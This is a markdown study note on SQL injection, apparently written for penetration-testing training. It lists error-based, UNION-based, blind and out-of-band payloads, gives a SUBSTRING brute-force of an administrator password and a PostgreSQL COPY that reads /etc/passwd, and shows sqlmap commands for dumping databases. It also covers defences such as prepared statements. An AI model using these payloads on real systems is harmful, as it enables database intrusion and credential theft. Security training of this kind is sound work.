# SQL Injection
- User supplied data is considered as part of the code/SQL query instead of just being considered as data.

## In-band (Classic) SQLi
- Attacker uses the same communication channel to perform the attack and get the results of the attack.
- Error based: force the db to generate an error to give more info about it Eg: the db version, the db query used, etc.
```
www.random.com/app.php?id='
```
- Union based: use the UNION operater to execute queries of your liking on the db. 
> NOTE: 
> The number of columns selected by both queries should be the same.
> The field types of both queries should be the same.
> The columns in the db should be known for the attacker to craft the UNION query.
```
# Finding the number of fields
# Type 1: Start by injecting NULL and then increase the number of NULLs till the query does not return an error
1337 UNION SELECT NULL; -- -
blabla' UNION SELECT NULL, NULL; -- -

# Type 2: Use ORDER BY: If the number of columns is 2, then at order by 3 it will return an error because the third column does not exist.
1337 ORDER BY 1 -- -
1337 ORDER BY 2 -- -
1337 ORDER BY 3 -- -

# If the SQL error is not visible (no response/empty page and you are not sure if it is blocked or erroring out)
# Use a valid id
1 UNION SELECT NULL; -- -
nybble04' UNION SELECT NULL; -- -

# To find the type of the field, substitute NULL with different data types.
```

### Example:

To find the column names of the people table (see [Try Hack Me Burp Repeater](https://tryhackme.com/module/learn-burp-suite))
```
# This will return only the first row of the output, so you will only see one column name
' UNION SELECT column_name, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name="people"

# To see all rows of the output use group_concat
' UNION SELECT group_concat(column_name), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name="people"
```

## Inferential (Blind) SQLi
- Attacker can't see the actual results of their query, but they can use other inferential parameters
- Boolean: see True/False results.
```
# Send an input that you know is accepted/True
' and 1=1

# Send an input that you know is not accepted/False
' and 1=2

# Observe the behaviour/response of the application for each input.
Eg: True -> "Success" ; False -> "Try again"
```

### Example:
- We can bruteforce the password using SUBSTRING(string, start_index, no_chars_to_extract).
```
' and SUBSTRING((SELECT password from users WHERE username = 'administrator'), 1, 1) ='a'    # check first char is a
' and SUBSTRING((SELECT password from users WHERE username = 'administrator'), 1, 1) ='b'    # check first char is b
                                                    ... ... ...
' and SUBSTRING((SELECT password from users WHERE username = 'administrator'), 2, 1) ='a'    # check second char is a
```
- Time: observe the time taken for query completion.

## Out-of-Band SQLi
- Attacker can't use the same channel and has to use a different network connection to make the attack. Eg: DNS or HTTP request.
> We need to know the type of database.
> We need to know if certain functions are enabled or can be enabled in the database.

- PostgreSQL [9.3 RCE using COPY](https://www.exploit-db.com/exploits/50847) , [reading files](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)
```
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```

## Defences
**Primary Defenses**
1. Prepared statements (Primary - Mandatory)
- Java
```java
String custname = request.getParameter("customerName");
String query = "SELECT account_balance FROM user_data WHERE user_name = ?";
PreparedStatement pstms = connection.prepareStatement (query);
pstms.setString(1, custname);
ResultSet results = pstmt.executeQuery();
```
- PHP
```php
$custname = $_GET["customerName"];
$stmt = $conn->prepare("SELECT account_balance FROM user_data WHERE user_name = ?");
$stmt->bind_param("s", $custname);                                                    # s is the type of the parameters passed
$stmt->execute();
```
2. Stored Procedures (Primary - Secondary)
3. Whitelist input validation: allow only some characters in the field value (Primary - Secondary)
4. Escape user supplied inputs (Primary - Mandatory)

**Additional Defenses (good to have)**
1. Least privilege: Do not run the data as root, run with least privileges (Additional - defence in depth)
2. Disable unnecessary funtions: Prevents OOB attacks (Additional - defence in depth)
3. CIS Benchmark Audits (Additional - defence in depth)
4. Apply db patches (Additional - defence in depth)

## SQL Map
Test if GET param is vulnerable
```
sqlmap –u <URL> -p <injection parameter> [options]
```
Test if POST param is vulnerable
```
Intercept request in Burp
Save raw form of request to a file
sqlmap –r <request file> -p parameter [options]
```

> If the previous two queries find that the target request is vulnerable to SQLi, we can proceed to dump information from the database using the commands below.

Extract db banner
```
sqlmap -u <target> --banner <other options>
```
Extract users
```
sqlmap -u <target> --users <other options>
```
Check if pwned user is an administrator
```
sqlmap -u <target> --is-dba <other options>
```
Extract databases
```
sqlmap -u <target> --dbs <other options>
```
Extract tables
```
sqlmap -u <target> -D <database> --tables <other options>
```
See columns of the table
```
sqlmap -u <target> -D <database> -T <tables, comma separated list> --columns <other options>
```
Get the values of the table columns (dump table)
```
sqlmap -u <target> -D <database> -T <table> -C <columns list> --dump <other options>
```
Test for blind injection
```
sqlmap -u <target> --string <true_string / false_string>
```
